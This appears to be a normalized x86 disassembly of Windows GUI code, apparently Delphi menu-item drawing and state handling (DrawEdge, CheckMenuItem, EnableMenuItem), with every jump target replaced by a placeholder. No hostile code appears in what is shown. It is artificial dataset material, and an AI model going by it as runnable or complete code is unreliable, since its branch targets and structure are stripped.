mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d9c8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41d9c8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d9c0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4246e4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d99c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dda0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_453e4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_423640
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41d1d4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44fc94
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d9c8
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ea8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41d4a0
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e234
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41df24
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_4501ac
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41e234
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41dcc0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41d1d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403344
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_452ea8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45430f
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_451f6c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41e070
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_452ea8
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45445c
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_454e40
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45448c
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_4544d8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4546ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403540
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45448c
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_454e40
mov esi eax
mov eax edi
call sub_45445c
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4044a0
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402d44
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_40412c
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_451f6c
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4043a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4546c1
lea eax [ ebp - 0x24 ]
call sub_404094
lea eax [ ebp - 0x10 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_452ea8
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_4546ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4044a0
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_4040e8
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_454714
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_454884
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_454894
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45475c
sub_45475c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_452e18
push eax
call CheckMenuItem
mov eax esi
call sub_454714
sub_4547b0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_454884
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_452e18
push eax
call EnableMenuItem
sub_454828
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_454be8
mov edx eax
mov ecx ebx
mov eax edi
call sub_452db8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_454714
sub_454894
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4143bc
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_451ec0
sub_454904
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_454884
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_4548ec
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_454c1c
mov ecx ebx
mov edx esi
mov eax edi
call sub_454a10
sub_45494c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_454884
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_454894
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4549a4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_454884
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_454894
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_454894
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_454a10
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_451ec0
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_452db8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_414438
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_454c88
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_454884
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452ce8
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4143bc
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_4143bc
mov dl [ eax + 0x3f ]
mov eax esi
call sub_454828
sub_454ac4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_451ec0
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_454884
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_452ce8
mov eax ebx
call sub_454884
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_4143bc
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_41425c
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_454b38
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45475c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45486c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45486c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_454c00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454884
mov edx eax
mov ecx esi
mov eax ebx
call sub_454a10
pop esi
pop ebx
retn
sub_454c1c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_454be8
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_454ac4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_451ec0
sub_454c44
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_454c88
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
